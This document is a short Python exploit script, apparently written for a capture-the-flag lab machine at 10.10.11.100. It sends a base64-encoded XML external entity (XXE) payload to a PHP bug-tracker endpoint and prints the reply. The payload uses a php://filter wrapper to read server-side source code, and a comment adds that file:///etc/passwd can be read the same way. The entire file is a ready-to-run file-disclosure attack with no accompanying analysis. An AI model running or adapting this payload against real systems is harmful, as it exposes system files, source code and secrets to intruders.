#!/usr/bin/env python3

import requests
import base64

# File can be also for example "file:///etc/passwd"
# PHP:// can expose server side source code
FILE = 'php://filter/convert.base64-encode/resource=tracker_diRbPr00f314.php'

TARGET_URL = "http://10.10.11.100/tracker_diRbPr00f314.php"

TEMPLATE = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{FILE}"> ]>
\t\t<bugreport>
\t\t<title>&xxe;</title>
\t\t<cwe>CVE-2021-2021</cwe>
\t\t<cvss>10.0</cvss>
\t\t<reward>1000</reward>
\t\t</bugreport>
"""

dataBytes = base64.b64encode(TEMPLATE.encode("utf-8"))
dataStr = str(dataBytes, "utf-8")

POST_DATA = {'data': dataStr}

req = requests.post(
    TARGET_URL,
    data=POST_DATA,
    headers={  # This maybe unnecessary
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Request-With": "XMLHttpRequest"
    },
)

# Debug
print(f'[*] Sending BASE64 string: {dataStr}\n')
print(req.text)
